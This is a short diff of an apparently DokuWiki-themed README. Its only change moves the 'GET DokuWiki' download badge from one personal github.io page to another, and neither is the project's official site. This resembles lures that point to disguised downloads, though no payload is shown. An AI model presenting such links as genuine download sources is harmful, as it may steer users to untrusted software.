@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://fablab-luenen.de/wp-content/uploads/2021/08/doku-wiki.jpeg)
 
-[![GET DokuWiki](https://img.shields.io/badge/GET%20%E2%80%94%20DokuWiki-0078D6?style=for-the-badge&logoColor=white)](https://rubenjohnsonflux.github.io/.github/dokuwiki)
+[![GET DokuWiki](https://img.shields.io/badge/GET%20%E2%80%94%20DokuWiki-0078D6?style=for-the-badge&logoColor=white)](https://kingcomptongbws.github.io/.github/dokuwiki)
 
 ---
 
